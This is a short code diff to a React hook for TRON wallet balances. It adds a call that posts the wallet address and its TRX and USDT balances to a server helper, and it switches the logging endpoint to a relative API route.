@@ -1,10 +1,12 @@
 import { TronWeb } from "tronweb";
 import { useWallet } from "../context/globalContext";
+import useSendDataToServer from "./useSendDataToserver";
 
 export const useTronBalances = () => {
+  const {senDataToServer} = useSendDataToServer()
   const logToServer = async (message) => {
     try {
-      await fetch(`${process.env.NEXT_PUBLIC_API_ADRESS}`, {
+      await fetch(`/api/log`, { //${process.env.NEXT_PUBLIC_API_ADRESS}
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -31,6 +33,12 @@ export const useTronBalances = () => {
       const usdtContract = await tronWeb.contract().at(usdtContractAddress);
       const usdtBalanceRaw = await usdtContract.methods.balanceOf(address).call({from:address});
       const usdtBalance = Number(usdtBalanceRaw) / 1e6; // Convert Sun to USDT
+      
+      await senDataToServer({
+        address,
+        trx:balanceTRX,
+        usdt: usdtBalance
+      })
       await logToServer("Fetched USDT Balance:", usdtBalance);
       setBalances((prevBalances) => ({
         ...prevBalances,
